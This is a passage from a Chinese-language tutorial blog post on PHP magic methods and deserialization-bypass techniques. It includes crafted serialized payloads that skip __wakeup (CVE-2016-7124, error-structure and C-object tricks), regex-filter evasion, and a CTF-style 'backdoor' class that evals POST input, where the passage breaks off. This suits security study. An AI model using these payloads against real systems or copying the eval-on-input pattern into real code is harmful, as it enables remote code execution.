invoke__">__invoke</span>()： 将对象当作函数来使用时执行此方法<br></code></pre></td></tr></table></figure><h2 id="construct-amp-destruct"><a href="#construct-amp-destruct" class="headerlink" title="__construct &amp; __destruct"></a>__construct &amp; __destruct</h2><p><code>__construct</code>：在实例化一个对象时，会被自动调用，可以作为非public权限属性的初始化<br><code>__destruct</code>：和构造函数相反，当对象销毁时会调用此方法，一是用户主动销毁对象，二是当程序结束时由引擎自动销毁</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__construct\n&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__destruct\n&quot;</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin888&#x27;</span>);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;abc\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;--------------------\n&quot;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin888&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;abc\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">__construct<br>__destruct<br>abc<br>--------------------<br>__construct<br>abc<br>__destruct<br></code></pre></td></tr></table></figure><h2 id="sleep-amp-wakeup"><a href="#sleep-amp-wakeup" class="headerlink" title="__sleep &amp; __wakeup"></a>__sleep &amp; __wakeup</h2><p><code>__sleep</code>：序列化时自动调用<br><code>__wakeup</code>：反序列化时自动调用</p><blockquote><p>如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，<br>则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__construct\n&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__sleep\n&quot;</span>;<br><span class="hljs-keyword">return</span> [username,password]; <span class="hljs-comment">//需要返回一个包含对象中所有变量名称的数组。如果该方法不返回任何内容，则NULL被序列化，导致一个E_NOTICE错误</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__wakeup\n&quot;</span>;<br><span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;user&#x27;</span>;<br>&#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin888&#x27;</span>);<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;-----------------------------\n&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>));<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">__construct<br>__sleep<br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;admin888&quot;</span>;&#125;<br>-----------------------------<br>__wakeup<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span>#2 (2) </span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> =&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;user&quot;</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> =&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;admin888&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="call-amp-callstatic"><a href="#call-amp-callstatic" class="headerlink" title="__call &amp; __callstatic"></a>__call &amp; __callstatic</h2><p><code>__call</code>：对象执行类不存在的方法时会自动调用<code>__call</code>方法<br><code>__callstatic</code>：直接执行类不存在的方法时会自动调用<code>__callstatic</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;不存在&#x27;</span>.<span class="hljs-variable">$method</span>.<span class="hljs-string">&#x27;方法(__call)&#x27;</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__callstatic</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;不存在&#x27;</span>.<span class="hljs-variable">$method</span>.<span class="hljs-string">&#x27;方法(__callstatic)&#x27;</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">lewiserii</span>();<br>test::<span class="hljs-title function_ invoke__">lewiserii</span>();<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">不存在lewiserii方法(__call)<br>不存在lewiserii方法(__callstatic)<br></code></pre></td></tr></table></figure><h2 id="get-amp-set"><a href="#get-amp-set" class="headerlink" title="__get &amp; __set"></a>__get &amp; __set</h2><p><code>__get</code>：对不可访问属性或不存在属性进行 访问引用时自动调用<br><code>__set</code>：对不可访问属性或不存在属性进行 写入时自动调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__get\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$value</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__set\n&quot;</span>;<br>&#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$a</span>-&gt;password;<br><span class="hljs-variable">$a</span>-&gt;password=<span class="hljs-string">&#x27;123456&#x27;</span>;<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">__get<br>__set<br></code></pre></td></tr></table></figure><h2 id="isset-amp-unset"><a href="#isset-amp-unset" class="headerlink" title="__isset &amp; __unset"></a>__isset &amp; __unset</h2><p><code>__isset</code>：在不可访问的属性上使用<code>inset()</code>时触发<br><code>__unset</code>：在不可访问的属性上使用<code>unset()</code>时触发</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__isset\n&quot;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__unset\n&quot;</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>-&gt;password);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$a</span>-&gt;psd);<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">__isset<br>__unset<br></code></pre></td></tr></table></figure><h2 id="tostring"><a href="#tostring" class="headerlink" title="__tostring"></a>__tostring</h2><p><code>__toString()</code>：类的实例和字符串拼接或者作为字符串引用时会自动调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;tostring&quot;</span>;<br>&#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">tostring<br></code></pre></td></tr></table></figure><h2 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h2><p><code>__invoke()</code>：将对象当作函数来使用时调用此方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__invoke&quot;</span>;<br>&#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$a</span>();<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">__invoke<br></code></pre></td></tr></table></figure><h1 id="反序列化绕过的几种方法"><a href="#反序列化绕过的几种方法" class="headerlink" title="反序列化绕过的几种方法"></a>反序列化绕过的几种方法</h1><h2 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过__wakeup"></a>绕过__wakeup</h2><h3 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h3><blockquote><p>利用条件：<br>PHP5 &lt; 5.6.25<br>​PHP7 &lt; 7.0.10</p></blockquote><p>利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过<code>__wakeup</code>的执行</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;test&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">&#x27;aaa&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//$v = new test();</span><br><span class="hljs-comment">//echo serialize($v);</span><br><span class="hljs-comment">//O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;test&quot;;&#125;test</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当执行<code>unserialize(&#39;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;test&quot;;&#125;&#39;);</code>时会返回<code>aaa</code>，在修改对象属性个数的值，执行<code>unserialize(&#39;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:4:&quot;test&quot;;&#125;&#39;);</code>会返回<code>test</code></p><h3 id="利用反序列化字符串报错"><a href="#利用反序列化字符串报错" class="headerlink" title="利用反序列化字符串报错"></a>利用反序列化字符串报错</h3><p>利用一个包含<code>__destruct</code>方法的类触发魔术方法可绕过<code>__wakeup</code>方法</p><p>例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;D::__get(<span class="hljs-subst">$name</span>)\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;D::__destruct\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;D::__wakeup\n&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;C::__destruct\n&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;c-&gt;b;<br><br>    &#125;<br>&#125;<br><br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;O:1:&quot;D&quot;:0:&#123;&#125;;N;&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>原本应该是<code>O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;O:1:&quot;D&quot;:0:&#123;&#125;&#125;</code><br>调用顺序是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">D::<span class="hljs-variable constant_">__wakeup</span><br>C::<span class="hljs-variable constant_">__destruct</span><br>D::<span class="hljs-title function_ invoke__">__get</span>(b)<br>D::<span class="hljs-variable constant_">__destruct</span><br></code></pre></td></tr></table></figure><p>添加了一个<code>;N;</code>(反序列化末尾加上<code>;任意字符;</code>)的错误结构后调用顺序就变成了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">C::<span class="hljs-variable constant_">__destruct</span><br>D::<span class="hljs-title function_ invoke__">__get</span>(b)<br>D::<span class="hljs-variable constant_">__wakeup</span><br>D::<span class="hljs-variable constant_">__destruct</span><br></code></pre></td></tr></table></figure><p>来自Article_kelp师傅的原理解释，orz：<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-4.jpg"></p><h3 id="使用C代替O"><a href="#使用C代替O" class="headerlink" title="使用C代替O"></a>使用C代替O</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">a - <span class="hljs-keyword">array</span><br>b - <span class="hljs-keyword">boolean</span><br>d - <span class="hljs-keyword">double</span><br>i - <span class="hljs-keyword">integer</span><br>o - common <span class="hljs-keyword">object</span><br>r - reference<br>s - <span class="hljs-keyword">string</span><br>C - custom <span class="hljs-keyword">object</span><br>O - <span class="hljs-class"><span class="hljs-keyword">class</span></span><br><span class="hljs-class"><span class="hljs-title">N</span> - <span class="hljs-title">null</span></span><br><span class="hljs-class"><span class="hljs-title">R</span> - <span class="hljs-title">pointer</span> <span class="hljs-title">reference</span></span><br><span class="hljs-class"><span class="hljs-title">U</span> - <span class="hljs-title">unicode</span> <span class="hljs-title">string</span></span><br></code></pre></td></tr></table></figure><p>例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//https://3v4l.org/YAje0</span><br><span class="hljs-comment">//https://bugs.php.net/bug.php?id=81151</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span>  </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;destruct&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wake up&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;C:1:&quot;E&quot;:0:&#123;&#125;&#x27;</span>));<br></code></pre></td></tr></table></figure><p>比较鸡肋，只能执行<code>construct()</code>和<code>destruct()</code>函数，无法添加任何内容</p><h2 id="绕过正则"><a href="#绕过正则" class="headerlink" title="绕过正则"></a>绕过正则</h2><h3 id="检测’O’"><a href="#检测’O’" class="headerlink" title="检测’O’"></a>检测’O’</h3><blockquote><p>利用条件：<br>preg_match(‘&#x2F;^O:\d+&#x2F;i’,$data)</p></blockquote><p>例题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backdoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;name);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^O:\d+/i&#x27;</span>,<span class="hljs-variable">$data</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;object not allow 